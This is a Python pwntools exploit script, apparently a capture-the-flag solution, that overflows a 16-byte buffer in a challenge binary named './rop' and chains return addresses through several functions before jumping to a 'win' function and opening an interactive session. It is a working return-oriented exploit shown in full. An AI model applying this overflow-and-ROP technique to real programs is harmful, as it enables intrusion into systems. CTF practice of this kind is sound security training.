from pwn import * 

def exploit():
    p = process("./rop")
    # p = remote("ctf.umbccd.io", 4100)
    binary = ELF("./rop")

    # shellcode = '\x31\xc0\x50\x68' #tilted_towers
    # shellcode = '\xc1\x89\xc2\xb0'
    # print disasm(shellcode)
    '''
    Shellcode set:
    1. tilted_towers
    2. junk_junction
    3. snobby_shores
    '''

    # padding = 16

    payload = ''
    payload += 'A' * 16
    payload += p32(binary.symbols['tilted_towers'])
    payload += p32(binary.symbols['tryme'])

    p.send(payload)

    payload = ''
    payload += 'A' * 16
    payload += p32(binary.symbols['junk_junction'])
    payload += p32(binary.symbols['tryme'])

    p.send(payload)

    payload = ''
    payload += 'A' * 16
    payload += p32(binary.symbols['snobby_shores'])
    payload += p32(binary.symbols['tryme'])

    p.send(payload)

    payload = ''
    payload += 'A' * 16
    payload += p32(binary.symbols['greasy_grove'])
    payload += p32(binary.symbols['tryme'])

    p.send(payload)

    payload = ''
    payload += 'A' * 16
    payload += p32(binary.symbols['lonely_lodge'])
    payload += p32(binary.symbols['tryme'])

    p.send(payload)

    payload = ''
    payload += 'A' * 16
    payload += p32(binary.symbols['dusty_depot'])
    payload += p32(binary.symbols['win'])

    # gdb.attach(p, '''
    #             b *0x8049712
    #             b *0x08049713
    #             ''')

    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()